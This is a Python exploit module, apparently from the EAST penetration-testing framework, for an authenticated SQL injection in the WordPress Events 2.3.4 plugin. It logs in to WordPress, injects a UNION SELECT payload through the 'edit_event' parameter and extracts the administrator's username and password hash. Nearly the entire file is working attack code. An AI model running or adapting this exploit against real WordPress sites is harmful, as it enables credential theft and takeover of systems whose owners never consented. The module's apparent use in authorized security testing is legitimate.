#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import re
import base64
import urllib
import urllib2
import cookielib

from collections import OrderedDict
sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_events_sqli"
INFO['DESCRIPTION'] = "WordPress Events 2.3.4 – Authenticated SQL Injection"
INFO['VENDOR'] = "https://wordpress.org/plugins/wp-events/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://lenonleite.com.br/en/blog/2017/11/03/wp-events-2-3-4-wordpress-plugin-sql-injetcion/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """HTTP GET parameter "edit_event" goes to SQL query without data senitization which arise SQL Injection vulnerability"""

INFO['CHANGELOG'] = "13 Nov, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Registered user')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.basepath = "/"
        self.username = ''
        self.password = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.ssl = self.args.get('SSL', self.ssl)
        
        self.cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookiesjar))
        urllib2.install_opener(opener)
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def auth_wordpress(self, username, password):

        url = self.make_url('/wp-login.php')
        data = 'log={}&pwd={}&redirect_to=&testcookie=0&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8'.format(username, password)
        
        fd = urllib2.urlopen(url)
        init_cookie = fd.headers['Set-Cookie']
        
        request = urllib2.Request(url, data)
        request.add_header('Cookie', init_cookie)
        fd = urllib2.urlopen(request)

        power_cookie = ''
        for k in self.cookiesjar:
            power_cookie += k.name + '=' + k.value + ';'
        return power_cookie
        
        
    def run(self):
        self.args()
        
        cookies = self.auth_wordpress(self.username, self.password)
        self.log(cookies)
        self.log()
        
        url = self.make_url('/wp-admin/admin.php?page=wp-events-edit&')
        sql = 'edit_event=' + urllib.quote('1 UNION SELECT 1, CONCAT(char(35,35,35),user_login,char(58),user_pass,char(35,35,35)),4,5,5,6,7,8,9,10,11,12,13,14 FROM wp_users where id=1')
        
        self.log('Begin extracting admin\'s credentials')
        result = ''
        try:
            request = urllib2.Request(url + sql, headers = {'Cookie': cookies})
            fd = urllib2.urlopen(request)
            result = fd.read()
            result = result.split('###')[1]
        except Exception as e:
            self.log(e)
            self.log("Failed!")
            self.finish(False)

        if result:
            self.log('Output format username:hash-password')
            self.log('=' * 60)
            self.log('End with: {}'.format(result))
            self.log('=' * 60)
            self.finish(True)
            
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
